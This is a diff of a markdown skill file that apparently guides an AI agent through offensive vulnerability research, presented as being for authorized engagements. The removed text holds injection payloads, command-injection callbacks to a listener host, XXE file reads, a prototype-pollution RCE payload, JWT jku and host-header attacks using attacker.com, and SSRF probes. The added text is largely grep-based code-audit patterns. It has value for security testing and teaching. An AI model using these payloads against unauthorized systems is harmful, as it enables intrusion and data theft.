@@ -1,882 +1,1239 @@
 ---
-description: "Novel vulnerability discovery from scratch: attack surface mapping, input class analysis, all vuln class hunting, source code analysis, fuzzing, chain construction, PoC development. Use when all known CVEs are exhausted or target runs custom code."
+description: Zero-day and vulnerability research methodology for authorized offensive security engagements. Covers source code review per language (PHP/Python/Node/Ruby/Java/Go/.NET), prototype pollution, GraphQL attacks, WebSocket security, OAuth/OIDC attacks, JWT attacks (none/confusion/jwks/kid/jku), SAML attacks, HTTP request smuggling (CL.TE/TE.CL/TE.TE), cache poisoning, business logic flaws, race conditions, mass assignment, IDOR hunting, subdomain takeover, XXE OOB, SSTI per engine (Jinja2/Twig/Freemarker/Velocity/ERB/Mako/Smarty/Pebble), and CVE-class pattern recognition. Load when researching vulnerabilities on a target.
 ---
 
-# SKILL — zeroday
+# ZERO-DAY AND VULNERABILITY RESEARCH SKILL
 
-## Purpose
-Systematic methodology for discovering novel, undisclosed vulnerabilities in live targets from scratch. This skill operates when all known CVE research is exhausted, the target is patched against public exploits, or the target runs custom code. It covers the complete process of finding a zero-day: attack surface analysis, code auditing, fuzzing, logic flaw discovery, chain construction, and PoC development — all from first principles.
+## PHASE 1 — SOURCE CODE REVIEW
 
-## Core principle
-A zero-day is not a special category of bug. It is a known vulnerability class applied to code that has never been audited for it. Every application that:
-- parses input
-- manages state
-- crosses trust boundaries
-- makes assumptions about caller behavior
-...has bugs waiting to be found. The skill is in knowing where to look and what to look for.
+### PHP
 
-## When to load
-- All known CVEs checked — none apply or all patched
-- Target runs custom or proprietary code
-- Standard scanner output is clean but the target is clearly complex
-- Asked to "find something new", "find a 0day", "look for novel bugs"
-- All public exploits have been tried and failed
-- Deep audit of a specific component is requested
-
----
-
-## Phase 1 — Attack surface mapping (before touching code)
-
-Before looking at any code or sending any payload, map every entry point precisely.
-
-### Entry point categories
-```
-HTTP parameters:
-  GET params:          ?id=1&user=foo&action=view
-  POST body (form):    username=foo&password=bar&csrf=token
-  POST body (JSON):    {"user":"foo","role":"admin","extra":{}}
-  POST body (XML):     <request><user>foo</user></request>
-  Path segments:       /api/v1/users/123/orders/456
-  Headers:             Cookie, Authorization, X-Custom-Header, Host, Referer
-  File uploads:        filename, content-type, file content, chunked transfer
-
-WebSocket:
-  Message structure
-  Authentication mechanism (JWT in message? header? handshake?)
-  Binary vs text frames
-
-GraphQL:
-  All queries
-  All mutations
-  All subscriptions
-  Introspection schema
-
-OAuth / SAML / OIDC flows:
-  state parameter
-  redirect_uri
-  code exchange
-  token validation
-
-Import / export features:
-  CSV import
-  Excel import
-  JSON import
-  XML import
-  ZIP upload
-
-Third-party integrations:
-  Webhook receivers
-  API callbacks
-  Payment notifications (Stripe, Razorpay, PayPal IPN)
-  Email receiving (inbound parse webhooks)
-```
-
-### Entry point inventory
-For each entry point record:
-```
-ID:           EP-<N>
-Method:       GET / POST / WebSocket / etc.
-URL:          <full URL>
-Parameters:   <list of all params and their types>
-Auth:         none / session cookie / JWT / API key / basic
-Observed type: string / int / boolean / JSON / XML / file / binary
-Server-side action: inferred from response behavior
-Interesting?: yes/no — why
-```
-
----
-
-## Phase 2 — Input class analysis
-
-For each interesting entry point, analyze the input systematically.
-
-### The 10 questions for every input
-```
-1. What TYPE does the app expect? (string / int / email / URL / JSON / XML / binary)
-2. What happens with WRONG TYPE? (int field gets string — error? silent cast? crash?)
-3. What is the MAX LENGTH? What happens at length+1? At 10x? At MAX_INT?
-4. What SPECIAL CHARACTERS are interpreted? (; | & ` $ \ / . * ? [ ])
-5. Is the value REFLECTED anywhere? (in response, email, PDF, log)
-6. Is the value STORED and displayed later? (XSS, stored injection)
-7. Is the value passed to a SYSTEM CALL? (shell, DB, file op, template engine)
-8. Is the value used in a COMPARISON? (auth check, permission check — type juggling?)
-9. Can the value be EMPTY or NULL? What happens?
-10. Is the value DESERIALIZED anywhere? (base64 decode -> unserialize)
-```
-
-### Type confusion opportunities
-```php
-# PHP loose comparison (==) vulnerabilities
-"0" == false     -> true
-"0e123" == "0"   -> true  (scientific notation, hash collisions)
-0 == "a"         -> true  (old PHP < 8)
-[] == false      -> true
-null == ""       -> true
-null == false    -> true
-
-# Use case: login with hash collision
-# If strcmp() used:
-strcmp([], "password") -> 0 (null — treated as false — auth bypass)
-
-# JavaScript type coercion
-"5" + 3 = "53"
-"5" - 3 = 2
-[] == false
-{} + [] = 0
-```
-
----
-
-## Phase 3 — Vulnerability class hunting
-
-Work through every class systematically. Do not skip classes because they seem unlikely.
-
-### 3.1 Injection — server-side
-
-#### SQL injection — finding it manually
-```
-Step 1: Identify every database-touching parameter
-  - Anything that returns different content for different values
-  - Anything that looks up a record by ID, name, email, slug
-
-Step 2: Test for error-based injection
-  Inject: '  (single quote)
-  Inject: ''  (two single quotes — should return to normal if injection point)
-  Inject: `)  (close paren)
-  Inject: \   (backslash — MySQL string escape)
-
-Step 3: Test for boolean-based blind
-  Original: ?id=5
-  True:     ?id=5 AND 1=1 -- -    (identical response to original)
-  False:    ?id=5 AND 1=2 -- -    (different response)
-
-Step 4: Test for time-based blind (when no response difference)
-  MySQL:    ?id=5 AND SLEEP(5) -- -
-  MSSQL:    ?id=5; WAITFOR DELAY '0:0:5' -- -
-  Oracle:   ?id=5 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- -
-  Postgres: ?id=5; SELECT pg_sleep(5) -- -
-
-Step 5: Test second-order injection
-  Register with username: admin'--
-  Then use the app as that user — does anything break?
-```
-
-#### Command injection — finding it manually
-```
-Inject in order (most to least likely to work):
-; id
-| id
-|| id
-& id
-&& id
-`id`
-$(id)
-;id;
-\nid
-
-# Blind command injection (no output)
-; sleep 5         (time delay confirms injection)
-; ping -c 5 <LHOST>   (DNS/ICMP callback)
-; curl http://<LHOST>/ci   (HTTP callback)
-; wget http://<LHOST>/ci
-
-# Context-specific
-# In filenames:
-test.jpg;id.jpg
-test$(id).jpg
-test`id`.jpg
-# In email fields:
-test+$(id)@test.com
-# In Host header:
-Host: target.com;id
-```
-
-#### LDAP injection
-```
-# Bypass authentication
-*)(&
-*)(uid=*))(|(uid=*
-admin)(&(password=*
-# Extract data
-*()|%26'
-*()|&'
-```
-
-#### XML injection / XXE discovery
-```
-# Does the app accept XML anywhere?
-# Change Content-Type: application/json to Content-Type: application/xml
-# Try uploading SVG, DOCX, XLSX, PDF, Office files
-
-# If XML accepted, test for XXE:
-<?xml version="1.0"?>
-<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]>
-<test>&x;</test>
-```
-
-#### Server-side template injection — discovery
-```
-# Inject into every string field that gets rendered:
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-#{7*7}
-*{7*7}
-{{7*'7'}}      (Jinja2 returns '7777777', Twig returns '49')
-${"freemarker.template.utility.Execute"?new()("id")}
-
-# Injection via HTTP headers (sometimes reflected in errors):
-User-Agent: {{7*7}}
-Referer: {{7*7}}
-X-Forwarded-For: {{7*7}}
-```
-
----
-
-### 3.2 Broken access control — finding it manually
-
-#### IDOR discovery
-```
-Step 1: Collect all object IDs in the application
-  - Numeric IDs (/api/orders/1234)
-  - UUIDs (/api/docs/550e8400-e29b-41d4-a716-446655440000)
-  - Hashes (/files/a1b2c3d4e5f6)
-  - Slugs (/users/johndoe)
-  - Encoded values (/item/dXNlcl9pZD0x)  <- base64 decode this
-
-Step 2: Create two accounts (A and B)
-  Account A: create a resource (order, document, message)
-  Record the ID/URL of that resource
-  Account B: attempt to access that URL directly
-
-Step 3: Test HTTP methods
-  If GET /api/orders/1234 returns 403, try:
-  POST /api/orders/1234
-  PUT /api/orders/1234
-  PATCH /api/orders/1234
-  DELETE /api/orders/1234
-
-Step 4: Test parameter pollution
-  /api/orders?user_id=<attacker_id>&user_id=<victim_id>
-  /api/orders?user_id=<victim_id>&user_id=<attacker_id>
-
-Step 5: Test mass assignment
-  POST /api/users/profile
-  {"name":"test","email":"test@test.com","role":"admin"}
-  # Does the app accept "role"?
-  # Try adding: "is_admin":true, "admin":true, "privilege":"admin"
-```
-
-#### Privilege escalation via missing checks
-```
-# Map admin-only endpoints from source, JS, or documentation
-# Access them while authenticated as regular user
-# Common admin paths:
-/api/admin/users
-/api/admin/settings
-/api/v1/internal/
-/debug/
-/actuator/env
-/actuator/shutdown
-
-# HTTP verb override
-POST /admin/delete-user
-X-HTTP-Method-Override: DELETE
-
-# Path traversal in access control
-/api/users/me/../admin/users
-/api/v1/user/../admin
-```
-
----
-
-### 3.3 Business logic flaws — the hardest to find, highest value
-
-These cannot be found by scanners. Require understanding the application's intended behavior.
-
-#### Framework for finding logic bugs
-```
-For every multi-step workflow (checkout, registration, password reset, 2FA):
-  1. Draw the intended flow (A -> B -> C -> D)
-  2. Try skipping steps (A -> C -> D, bypassing B)
-  3. Try going backwards (D -> B -> C)
-  4. Try repeating steps (A -> B -> B -> C)
-  5. Try parallelizing (send B twice simultaneously)
-  6. Try invalid state transitions (what if B requires C to be done first?)
-```
-
-#### Race conditions
-```
-# Identify operations that check state then modify it:
-- Balance check -> transfer
-- Coupon validity check -> apply coupon
-- Vote/like count -> increment
-- Rate limit check -> allow request
-- Token validity check -> consume token
-
-# Test with parallel requests (Burp Turbo Intruder or curl):
-# Send 50 identical requests simultaneously
-python3 -c "
-import threading, requests
-url = 'https://target.com/api/coupon/apply'
-cookies = {'session': 'YOUR_SESSION'}
-data = {'code': 'SAVE10'}
-results = []
-def send():
-    r = requests.post(url, json=data, cookies=cookies)
-    results.append(r.status_code)
-threads = [threading.Thread(target=send) for _ in range(50)]
-[t.start() for t in threads]
-[t.join() for t in threads]
-print(results)
-"
-
-# Single-use coupon applied 50 times? Race condition confirmed.
-```
-
-#### Integer and numeric boundary issues
-```
-# Test numeric inputs with:
--1, 0, 1, 2^31-1 (2147483647), 2^31 (2147483648), 2^32-1, 2^63-1
-0.1, -0.1, 0.001, 1e10, 1e-10
-NaN, Infinity, -Infinity (JavaScript)
-
-# Example: negative quantity in shopping cart
-POST /api/cart/add
-{"product_id":1,"quantity":-100}
-# Does the total go negative? Does the app refund money?
-
-# Example: integer overflow on vote count
-# Send 2^31 vote requests — does counter wrap to negative?
-```
-
-#### Password reset logic
-```
-# Test every step of the reset flow:
-1. Does the token expire? Test tokens from 1 hour, 24 hours, 1 week ago
-2. Can the token be used multiple times?
-3. Is the token predictable? (sequential, timestamp-based, short)
-4. Is the token leaked in response headers, Referer header, or logs?
-5. Does changing password invalidate the token?
-6. Can you reset another user's password by manipulating user_id param?
-7. What if you submit the reset form with victim's email but your token?
-8. Is there a host header injection? (reset link uses Host header -> change to attacker domain)
-
-# Host header injection in password reset:
-POST /forgot-password HTTP/1.1
-Host: attacker.com
-
-# If reset email contains: "Click here: http://attacker.com/reset?token=..."
-# Victim clicks -> token sent to attacker
-```
-
----
-
-### 3.4 Authentication flaws
-
-#### JWT vulnerabilities — full checklist
 ```bash
-# Decode JWT (base64url decode each part)
-echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
-# Or: jwt.io
+grep -rn "eval\s*(\|exec\s*(\|system\s*(\|passthru\s*(\|shell_exec\s*(\|proc_open\|popen\s*(" \
+  --include="*.php" ./ | grep -v "^\s*//" | tee audit_php_rce.txt
+grep -rn '`.*\$_' --include="*.php" ./ | tee -a audit_php_rce.txt
 
-# Test 1: Algorithm none
-# Change header {"alg":"HS256"} to {"alg":"none"}
-# Remove signature (keep trailing dot)
-# Modified JWT: header.payload.
+grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" --include="*.php" ./ \
+  | grep -iE "query|mysql_query|mysqli_query|PDO.*query|execute|select|insert|update|delete" \
+  | grep -v "htmlspecialchars\|intval\|is_int\|bindParam\|bindValue\|prepare" \
+  | tee audit_php_sqli.txt
 
-# Test 2: RS256 to HS256 confusion
-# If server uses RS256, public key is often accessible
-# Sign with the PUBLIC KEY using HS256 — server may verify with same key
-# Get public key: /api/.well-known/jwks.json or /oauth/jwks
+grep -rn "include\s*(\|require\s*(\|include_once\s*(\|require_once\s*(" --include="*.php" ./ \
+  | grep "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\.\.\/" | tee audit_php_lfi.txt
 
-# Test 3: Weak secret brute force
-hashcat -a 0 -m 16500 <JWT> /home/fox/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+grep -rn "move_uploaded_file\|file_put_contents\|copy\s*(" --include="*.php" ./ \
+  | grep "\$_FILES" | tee audit_php_upload.txt
 
-# Test 4: kid (key ID) injection
-# Change kid to: ../../../../dev/null
-# Sign with empty string as secret
-# Or: kid = SQL injection -> ' UNION SELECT 'hacker' -- -
+grep -rn "unserialize\s*(" --include="*.php" ./ | tee audit_php_deserial.txt
+grep -rn "__wakeup\|__destruct\|__toString\|__call\|__get\|__set" \
+  --include="*.php" ./ | tee audit_php_gadgets.txt
 
-# Test 5: x5u / jku injection
-# Point to attacker-controlled JWKS endpoint
-{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
+grep -rn "curl_init\|curl_exec\|file_get_contents\s*(\|fopen\s*(\|fsockopen" \
+  --include="*.php" ./ \
+  | grep "\$_\|param\|url\|host\|target\|redirect\|request" | tee audit_php_ssrf.txt
 
-# Test 6: Expired token accepted
-# Grab old token, replay it — does server check exp claim?
+grep -rn "echo\s\|print\s\|printf\s*(" --include="*.php" ./ \
+  | grep "\$_GET\|\$_POST\|\$_REQUEST" \
+  | grep -v "htmlspecialchars\|htmlentities\|strip_tags\|esc_html" | tee audit_php_xss.txt
+
+grep -rn "header.*Location\|header.*location" --include="*.php" ./ \
+  | grep "\$_GET\|\$_POST\|\$_REQUEST" | tee audit_php_redirect.txt
+
+grep -rn "==\b\|!=\b\|in_array\|strcmp\|strcasecmp\|strncmp\|switch\s*(" \
+  --include="*.php" ./ | grep -v "===" | head -100 | tee audit_php_typejuggling.txt
+
+grep -rn "simplexml_load_string\|simplexml_load_file\|DOMDocument\|xml_parse\|libxml_disable_entity_loader" \
+  --include="*.php" ./ | tee audit_php_xxe.txt
+
+grep -rn "\.new\s*(params\|\.update\s*(params\|\.create\s*(params\|request\(\)->all\(\)\|Input::all" \
+  --include="*.php" ./ | tee audit_php_massassign.txt
 ```
 
-#### OAuth 2.0 vulnerabilities
-```
-# Test 1: Missing state parameter (CSRF on OAuth)
-# If /oauth/authorize doesn't use state parameter:
-# Craft link -> victim clicks -> attacker's account linked to victim
+### Python / Django / Flask
 
-# Test 2: redirect_uri not validated
-# Try: redirect_uri=https://evil.com
-# Try: redirect_uri=https://target.com.evil.com
-# Try: redirect_uri=https://target.com/../../evil
-# Try: redirect_uri=https://target.com/callback?next=https://evil.com
-
-# Test 3: Authorization code reuse
-# Intercept auth code
-# Use it twice — does server reject second use?
-
-# Test 4: Access token in referrer
-# After OAuth completion, navigate to external link
-# Check Referer header — does it contain access_token?
-
-# Test 5: scope escalation
-# Request scope=read, get token
-# Use token to access write endpoints — are scopes enforced?
-```
-
----
-
-### 3.5 Deserialization — finding it
-
-```
-# Where to look:
-- Cookies containing base64 data (especially Java apps: rO0A = Java serialized)
-- Hidden form fields with base64/binary data
-- ViewState in ASP.NET apps (always test this)
-- Redis session store values
-- Message queue payloads
-- API responses that get sent back as requests
-
-# Detection:
-- Java serialized data starts with: rO0A (base64) or 0xAC 0xED (binary)
-- PHP serialized data: O:4:"User":1:{s:4:"name";s:5:"admin";}
-- Python pickle: base64 decode -> contains b'\x80\x04'
-- .NET BinaryFormatter: AAEAAAD (base64)
-
-# ASP.NET ViewState testing:
-# Decode ViewState (base64)
-# If not encrypted -> tamper with deserialized object
-# If __VIEWSTATEGENERATOR present -> need to match it
-# Tools: ysoserial.net for .NET, YSoSerial for Java
-
-# Java detection in headers:
-# Set-Cookie: JSESSIONID=... (Java app)
-# Set-Cookie: session=rO0A... (serialized Java object in cookie!)
-```
-
----
-
-### 3.6 SSRF — finding it
-
-```
-# Where to find SSRF:
-- Any URL parameter: ?url=, ?redirect=, ?link=, ?src=, ?dest=, ?next=, ?target=, ?proxy=
-- Webhook configuration: "callback_url", "webhook_url", "notify_url"
-- PDF/screenshot generation services
-- Image proxy services ("avatar_url", "profile_picture")
-- Import features that fetch from URL
-- XML requests (XXE -> SSRF)
-- DNS lookback: any feature that sends email or pings a server
-
-# Discovery methodology:
-Step 1: Send a URL pointing to your server
-  Value: http://<LHOST>/ssrf-probe
-  Listen: nc -lvnp 80
-
-Step 2: If direct IP blocked, try:
-  http://169.254.169.254/ (cloud metadata)
-  http://localhost/
-  http://0.0.0.0/
-  http://[::1]/
-
-Step 3: Probe internal services
-  http://127.0.0.1:22/
-  http://127.0.0.1:3306/
-  http://127.0.0.1:6379/     Redis
-  http://127.0.0.1:27017/    MongoDB
-  http://127.0.0.1:9200/     Elasticsearch
-  http://127.0.0.1:2375/     Docker API
-  http://127.0.0.1:10250/    Kubelet
-  http://10.0.0.0/24         Internal subnet
-
-Step 4: If response is blind (no response body), use DNS callback
-  Value: http://<random>.<LHOST>/ (use interactsh)
-  # If DNS query arrives, SSRF confirmed blind
-```
-
----
-
-### 3.7 Prototype pollution (JavaScript/Node.js)
-
-```javascript
-// Where to find it:
-// - Any feature that deeply merges user-controlled JSON into an object
-// - Libraries: lodash.merge, jQuery.extend, deepmerge (old versions)
-// - Query parameter parsers that parse nested keys: ?__proto__[admin]=true
-
-// Test payloads:
-{"__proto__":{"admin":true}}
-{"constructor":{"prototype":{"admin":true}}}
-{"__proto__":{"isAdmin":true}}
-
-// URL query string pollution:
-?__proto__[admin]=1
-?constructor[prototype][admin]=1
-
-// Confirm pollution:
-// After sending payload, check if {} (empty object) has .admin property
-// In Node.js: {}.__proto__.admin === true
-
-// Escalation to RCE (common in Node.js):
-{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=0.0.0.0:1337"}}
-{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').execSync('id > /tmp/pwned');var __tmp2"}}
-```
-
----
-
-### 3.8 Web cache poisoning
-
-```
-# Identify cache indicators in response:
-X-Cache: HIT / MISS
-Age: <seconds>
-Vary: <headers>
-CF-Cache-Status: HIT
-
-# Find unkeyed inputs (headers not in cache key but reflected in response):
-X-Forwarded-Host: evil.com
-X-Forwarded-Scheme: http
-X-Original-URL: /admin
-X-Rewrite-URL: /admin
-
-# Test:
-1. Send request with X-Forwarded-Host: evil.com
-2. Check if evil.com appears in response (e.g., in canonical URL, redirect URL, resource URL)
-3. If yes, send without header -> check if poisoned response is cached
-4. Next visitor receives poisoned response with evil.com in it
-
-# DOM-based cache poisoning:
-# Inject XSS payload via unkeyed header that gets reflected into JavaScript
-X-Forwarded-Host: evil.com"></script><script>alert(1)</script>
-```
-
----
-
-## Phase 4 — Source code analysis (when available)
-
-### Getting source code
 ```bash
-# Check for exposed .git
-curl -s https://target.com/.git/HEAD
-# If 200 -> dump the repo
-git clone https://target.com/ /tmp/target-git-dump 2>/dev/null || \
-  python3 git-dumper.py https://target.com/ /tmp/target-git-dump
+grep -rn "\.raw\s*(\|\.execute\s*(\|cursor\.execute\|extra\s*(select\|RawSQL\|connection\.cursor" \
+  --include="*.py" ./ | grep -v "parameterized\|bindparam\|%s.*," | tee audit_py_sqli.txt
 
-# Check for source map files
-curl -s https://target.com/app.js.map  # contains original source
-curl -s https://target.com/bundle.js.map
+grep -rn "render_template_string\|Markup\s*(\|jinja2\.Template\|Environment.*from_string\|Template\s*(" \
+  --include="*.py" ./ | grep "request\.\|input\|user\|param\|data" | tee audit_py_ssti.txt
+grep -rn "mark_safe\s*(\|format_html.*%s\|escape=False" --include="*.py" ./ | tee -a audit_py_ssti.txt
 
-# Check for backup files
-/index.php~ /index.php.bak /index.php.orig /index.php.save
-/config.php.bak /.config.php.swp (vim swap)
+grep -rn "os\.system\s*(\|subprocess\.call\|subprocess\.run\|subprocess\.Popen\|os\.popen\|commands\." \
+  --include="*.py" ./ \
+  | grep -v "#" | grep "shell=True\|str(\|format(\|\$\|user\|input\|param\|request\." | tee audit_py_cmdi.txt
 
-# GitHub/GitLab search
-https://github.com/search?q=<company>+<technology>&type=repositories
-https://github.com/search?q="target.com"+password
+grep -rn "pickle\.loads\|pickle\.load\|yaml\.load\s*(\|marshal\.loads\|shelve\.open\|jsonpickle" \
+  --include="*.py" ./ | grep -v "yaml\.safe_load\|yaml\.full_load\|#" | tee audit_py_deserial.txt
+
+grep -rn "requests\.get\|requests\.post\|urllib\.request\|urllib2\.urlopen\|httplib\|http\.client" \
+  --include="*.py" ./ | grep "request\.\|param\|url\|user_input\|data\[" | tee audit_py_ssrf.txt
+
+grep -rn "debug\s*=\s*True\|app\.run.*debug\|FLASK_DEBUG\s*=\s*1\|FLASK_ENV.*development" \
+  --include="*.py" ./ | tee audit_py_debug.txt
+
+grep -rn "fields\s*=\s*'__all__'\|fields\s*=\s*\"__all__\"\|exclude\s*=\s*\[\]" \
+  --include="*.py" ./ | tee audit_py_massassign.txt
+
+grep -rn "open\s*(\|send_file\s*(\|send_from_directory\s*(" --include="*.py" ./ \
+  | grep "request\.\|param\|path\|filename\|name\|file" | tee audit_py_traversal.txt
+
+grep -rn "etree\.parse\|etree\.fromstring\|ElementTree\.parse\|minidom\.parseString\|saxutils" \
+  --include="*.py" ./ | tee audit_py_xxe.txt
+
+grep -rn "redirect\s*(\|HttpResponseRedirect\s*(\|url_for\s*(" --include="*.py" ./ \
+  | grep "request\.\|param\|next\|url\|redirect_to" | tee audit_py_redirect.txt
 ```
 
-### Automated static analysis
+### Node.js / Express
+
 ```bash
-# PHP
-grep -rn "eval\|exec\|system\|shell_exec\|passthru\|popen\|proc_open" --include="*.php" . 2>/dev/null
-grep -rn "unserialize\|pickle" --include="*.php" . 2>/dev/null
-grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" --include="*.php" . 2>/dev/null | grep -v "htmlspecialchars\|strip_tags\|filter_input"
-grep -rn "mysqli_query\|->query\|execute" --include="*.php" . 2>/dev/null | grep "\$"
+grep -rn "exec\s*(\|execSync\s*(\|spawn\s*(\|execFile\s*(\|spawnSync\|eval\s*(" \
+  --include="*.js" --include="*.ts" ./ \
+  | grep "req\.\|param\|body\|query\|input\|user" | tee audit_node_cmdi.txt
 
-# Python
-grep -rn "eval\|exec\|subprocess\|os\.system\|os\.popen" --include="*.py" . 2>/dev/null
-grep -rn "pickle\.loads\|yaml\.load\|eval\|exec" --include="*.py" . 2>/dev/null
-grep -rn "format\|%.*%.*%" --include="*.py" . 2>/dev/null | grep "query\|sql\|SELECT"
+grep -rn "query\s*(\|execute\s*(\|raw\s*(\|knex\.raw\|sequelize\.query" \
+  --include="*.js" --include="*.ts" ./ \
+  | grep "req\.\|param\|body\|query\[" | grep -v "?\s*,\|parameterized\|prepare" | tee audit_node_sqli.txt
 
-# JavaScript / Node.js
-grep -rn "eval\|Function(\|child_process\|exec\|spawn" --include="*.js" . 2>/dev/null
-grep -rn "__proto__\|constructor.prototype\|merge\|extend\|assign" --include="*.js" . 2>/dev/null
-grep -rn "require('vm')\|require('child_process')" --include="*.js" . 2>/dev/null
+grep -rn "merge\s*(\|extend\s*(\|deepMerge\|assign\s*(\|defaults\s*(\|lodash\|_.merge\|_.set" \
+  --include="*.js" --include="*.ts" ./ | grep "req\.\|body\|param\|user\|input" | tee audit_node_proto.txt
+grep -rn "\.__proto__\|constructor\[.prototype.\]\|prototype\[" \
+  --include="*.js" --include="*.ts" ./ | tee -a audit_node_proto.txt
 
-# Secrets
-grep -rE "(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key)\s*[=:]\s*['\"][^'\"]{8,}['\"]" . 2>/dev/null
-grep -rE "(password|passwd|pwd)\s*=\s*['\"][^'\"]{6,}['\"]" . 2>/dev/null
-grep -rE "AKIA[0-9A-Z]{16}" . 2>/dev/null   # AWS key
-grep -rE "ghp_[a-zA-Z0-9]{36}" . 2>/dev/null  # GitHub token
+grep -rn "axios\.\|fetch\s*(\|request\s*(\|http\.get\|https\.get\|got\s*(" \
+  --include="*.js" --include="*.ts" ./ \
+  | grep "req\.\|param\|body\|url\|host\|target" | tee audit_node_ssrf.txt
 
-# Semgrep (automated)
-semgrep --config=p/security-audit --config=p/owasp-top-ten . 2>/dev/null | tee recon/vulns/semgrep.txt
+grep -rn "unserialize\s*(\|node-serialize\|serialize-javascript\|deserialize\s*(" \
+  --include="*.js" ./ | tee audit_node_deserial.txt
+
+grep -rn "readFile\s*(\|readFileSync\s*(\|createReadStream\s*(\|sendFile\s*(\|res\.download\|serveStatic" \
+  --include="*.js" --include="*.ts" ./ \
+  | grep "req\.\|param\|body\|query\|user" | tee audit_node_traversal.txt
+
+grep -rn "ejs\.render\|pug\.render\|handlebars\.compile\|nunjucks\.renderString\|mustache\.render" \
+  --include="*.js" --include="*.ts" ./ \
+  | grep "req\.\|param\|body\|user\|input" | tee audit_node_ssti.txt
+
+grep -rn "\.find\s*(\|\.findOne\s*(\|\.update\s*(\|\.remove\s*(\|\.deleteOne\s*(\|\.aggregate\s*(" \
+  --include="*.js" --include="*.ts" ./ \
+  | grep "req\.body\|req\.query\|req\.params" | tee audit_node_nosqli.txt
+
+grep -rn "jwt\.sign\|jwt\.verify\|jsonwebtoken" --include="*.js" --include="*.ts" ./ \
+  | grep "secret\s*[=:]\s*['\"]" | tee audit_node_jwt.txt
+
+grep -rn "\.create\s*(\|\.update\s*(\|\.findByIdAndUpdate\|Model\.build\|new.*Model\s*(" \
+  --include="*.js" --include="*.ts" ./ | grep "req\.body\b" | tee audit_node_massassign.txt
 ```
 
-### Manual code review checklist
-```
-Authentication:
-  [ ] Password hashing algorithm (bcrypt/argon2 = good, MD5/SHA1 = bad)
-  [ ] Token generation (os.urandom/secrets = good, random.random = bad)
-  [ ] Session invalidation on logout
-  [ ] Password reset token entropy
+### Ruby on Rails
 
-Authorization:
-  [ ] Every route has authorization check
-  [ ] Check is at route level AND service level
-  [ ] Object-level authorization (not just resource type, but specific resource)
-  [ ] JWT signature verification (not just decode, actually verify)
-
-Input handling:
-  [ ] Parameterized queries everywhere
-  [ ] Output encoding before rendering
-  [ ] File upload validation (not just extension, but content)
-  [ ] Redirect URL validation (whitelist, not blacklist)
-
-Cryptography:
-  [ ] No custom crypto
-  [ ] IV/nonce reuse (ECB mode usage)
-  [ ] Predictable random number generation
-  [ ] Hardcoded keys or IVs
-```
-
----
-
-## Phase 5 — Fuzzing
-
-### Web fuzzing strategy
 ```bash
-# Fuzz every parameter for injection
-for param in $(cat recon/http/parameters.txt); do
-  ffuf -u "https://target.com/endpoint?${param}=FUZZ" \
-    -w /home/fox/SecLists/Fuzzing/special-chars.txt \
-    -mc all -fc 200 \
-    -o recon/vulns/fuzz-${param}.json -of json
-done
+grep -rn "\.where\s*(\".*#{\|\.find_by_sql\|\.execute\s*(\|ActiveRecord::Base\.connection" \
+  --include="*.rb" ./ | tee audit_rb_sqli.txt
+grep -rn "system\s*(\|exec\s*(\|`.*#{\|\%x(\|IO\.popen\|spawn\s*(" \
+  --include="*.rb" ./ | grep "params\|request\|session\|user" | tee audit_rb_cmdi.txt
+grep -rn "\.new\s*(params\|\.update\s*(params\|\.update_attributes\s*(params\|\.create\s*(params" \
+  --include="*.rb" ./ | tee audit_rb_massassign.txt
+grep -rn "permit!\s*\|permit(\s*)" --include="*.rb" ./ | tee -a audit_rb_massassign.txt
+grep -rn "ERB\.new\s*(\|render.*inline.*\|render_to_string.*erb" \
+  --include="*.rb" ./ | grep "params\|request\|user\|input" | tee audit_rb_ssti.txt
+grep -rn "Marshal\.load\|YAML\.load\s*(\|Oj\.load\|JSON\.unsafe_load" \
+  --include="*.rb" ./ | grep -v "safe_load\|#" | tee audit_rb_deserial.txt
+grep -rn "redirect_to\s*(params\|redirect_to.*params" --include="*.rb" ./ | tee audit_rb_redirect.txt
+```
 
-# JSON body fuzzing
-ffuf -u "https://target.com/api/endpoint" \
-  -X POST \
+### Java Spring
+
+```bash
+grep -rn "createNativeQuery\|createQuery\|executeQuery\|prepareStatement\|jdbcTemplate" \
+  --include="*.java" ./ | grep -v "\?" | tee audit_java_sqli.txt
+grep -rn "Runtime\.getRuntime\(\)\.exec\|ProcessBuilder\|ScriptEngine\|Class\.forName\|Method\.invoke" \
+  --include="*.java" ./ | tee audit_java_rce.txt
+grep -rn "ObjectInputStream\|readObject\s*(\|XMLDecoder\|XStream\|readResolve\|readExternal" \
+  --include="*.java" ./ | tee audit_java_deserial.txt
+grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory\|TransformerFactory" \
+  --include="*.java" ./ | tee audit_java_xxe.txt
+grep -rn "new URL\s*(\|openConnection\|HttpURLConnection\|RestTemplate\|WebClient\|OkHttpClient" \
+  --include="*.java" ./ | grep "getParameter\|request\.\|@RequestParam\|@PathVariable" | tee audit_java_ssrf.txt
+grep -rn "TemplateEngine\|FreeMarker\|VelocityEngine\|new Template\|processTemplate" \
+  --include="*.java" ./ | grep "getParameter\|request\.\|model\." | tee audit_java_ssti.txt
+grep -rn "@ModelAttribute\|@RequestBody" --include="*.java" ./ | tee audit_java_massassign.txt
+```
+
+### Go
+
+```bash
+grep -rn "\.Query\s*(\|\.Exec\s*(\|\.QueryRow\s*(" --include="*.go" ./ \
+  | grep "fmt\.Sprintf\|+\s*r\.\|Sprintf" | grep -v "\?\|\$[0-9]" | tee audit_go_sqli.txt
+grep -rn "exec\.Command\s*(" --include="*.go" ./ | grep "r\.\|Param\|Form\|Query" | tee audit_go_cmdi.txt
+grep -rn "os\.Open\s*(\|ioutil\.ReadFile\s*(\|os\.ReadFile\|filepath\.Join\s*(" --include="*.go" ./ \
